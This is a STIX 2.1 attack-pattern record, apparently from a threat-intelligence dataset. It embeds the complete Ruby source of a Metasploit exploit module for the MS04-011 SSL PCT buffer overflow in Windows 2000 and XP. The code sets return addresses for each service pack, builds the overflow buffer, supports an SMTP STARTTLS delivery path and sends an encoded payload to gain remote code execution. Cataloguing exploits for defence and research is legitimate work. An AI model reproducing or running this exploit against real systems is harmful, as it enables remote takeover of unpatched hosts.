{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6b356cc-9555-4c9d-b8b8-e743bd46bf04",
    "created": "2024-08-14T16:50:38.528675Z",
    "modified": "2024-08-14T16:50:38.528679Z",
    "name": "MS04-011 Microsoft Private Communications Transport Overflow",
    "description": " This module exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack. This code is based on Johnny Cyberpunk's THC release and has been tested against Windows 2000 and Windows XP. To use this module, specify the remote port of any SSL service, or the port and protocol of an application that uses SSL. The only application protocol supported at this time is SMTP. You only have one chance to select the correct target, if you are attacking IIS, you may want to try one of the other exploits first (WebDAV). If WebDAV does not work, this more than likely means that this is either Windows 2000 SP4+ or Windows XP (IIS 5.0 vs IIS 5.1). Using the wrong target may not result in an immediate crash of the remote system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ssl/ms04_011_pct.rb",
            "external_id": "ms04_011_pct.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0719"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS04-011 Microsoft Private Communications Transport Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the Microsoft\n        Windows SSL PCT protocol stack. This code is based on Johnny\n        Cyberpunk's THC release and has been tested against Windows\n        2000 and Windows XP. To use this module, specify the remote\n        port of any SSL service, or the port and protocol of an\n        application that uses SSL. The only application protocol\n        supported at this time is SMTP. You only have one chance to\n        select the correct target, if you are attacking IIS, you may\n        want to try one of the other exploits first (WebDAV). If\n        WebDAV does not work, this more than likely means that this\n        is either Windows 2000 SP4+ or Windows XP (IIS 5.0 vs IIS\n        5.1). Using the wrong target may not result in an immediate\n        crash of the remote system.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0719'],\n          [ 'OSVDB', '5250'],\n          [ 'BID', '10116'],\n          [ 'MSB', 'MS04-011'],\n\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1800,\n          'BadChars' => \"\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows 2000 SP4',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x67419ce8, # jmp [esp + 0x6c]\n            },\n          ],\n          [\n            'Windows 2000 SP3',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x67419e1d, # jmp [esp + 0x6c]\n            },\n          ],\n          [\n            'Windows 2000 SP2',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x6741a426, # jmp [esp + 0x6c]\n            },\n          ],\n          [\n            'Windows 2000 SP1',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x77e4f44d, # jmp [ebx + 0x14]\n            },\n          ],\n          [\n            'Windows 2000 SP0',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x7658a6cb, # jmp [ebx + 0x0e]\n            },\n          ],\n          [\n            'Windows XP SP0',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x0ffb7de9, # jmp [esp + 0x6c]\n            },\n          ],\n          [\n            'Windows XP SP1',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x0ffb832f, # jmp [esp + 0x6c]\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-04-13',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('PROTO', [true, \"The application protocol: raw or smtp\", \"raw\"])\n      ])\n  end\n\n  def exploit\n    begin\n      connect\n    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused => e\n      print_error(\"Cannot connect: #{e.message}\")\n      return\n    end\n\n    print_status(\"Trying target #{target.name} with proto #{datastore['PROTO']}...\")\n\n    # This is a heap ptr to the ssl request\n    # ... and just happens to not die ...\n    # Thanks to CORE and Halvar\n    #\n    #   80620101     =>  and byte ptr [esi+1], 0x2\n    #   bd00010001   =>  mov ebp, 0x1000100\n    #   0016         =>  add [esi], dl\n    #   8f8201000000 =>  pop [esi+1]\n    #   eb0f         =>  jmp short 11 to shellcode\n\n    buf = \"\\x80\\x66\\x01\\x02\\xbd\\x00\\x01\\x00\\x01\\x00\\x16\\x8f\\x86\\x01\\x00\\x00\\x00\"+\n      \"\\xeb\\x0f\" + 'XXXXXXXXXXX' +\n      [target.ret ^ 0xffffffff].pack('V')+\n      payload.encoded\n\n    # Connect to a SMTP service, call STARTTLS\n    if (datastore['PROTO'] == 'smtp')\n      begin\n        greeting = sock.get_once\n      rescue ::EOFError => e\n        print_error(\"Failed to receive data for the protocol greeting: #{e.message}\")\n        return\n      end\n\n      begin\n        sock.put('HELO ' + (rand_text_alphanumeric(rand(10)+1)) + \"\\r\\n\")\n        resp = sock.get_once\n      rescue ::Timeout::Error\n        print_error(\"Timedout while sending HELO\")\n        return\n      rescue ::EOFError => e\n        print_error(\"Failed to receive a response for HELO: #{e.message}\")\n        return\n      end\n\n      begin\n        sock.put(\"STARTTLS\\r\\n\")\n        resp = sock.get_once\n      rescue ::Timeout::Error\n        print_error(\"Timed out while sending STARTTLS\")\n        return\n      rescue ::EOFError => e\n        print_error(\"Failed to receive a response for STARTTLS: #{e.message}\")\n        return\n      end\n\n      if (resp and resp !~ /^220/)\n        print_warning(\"Warning: this server may not support STARTTLS\")\n      end\n    end\n\n\n    begin\n      sock.put(buf)\n      resp = sock.get_once\n    rescue ::Timeout::Error => e\n      print_error(\"Timed out while sending the malicious data\")\n      return\n    rescue ::EOFError => e\n      print_error(\"Failed to receive a response after the malicious data: #{e.message}\")\n      return\n    end\n\n    if (resp == \"\\x00\\x00\\x01\")\n      print_status(\"The response indicates that the PCT protocol is disabled\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}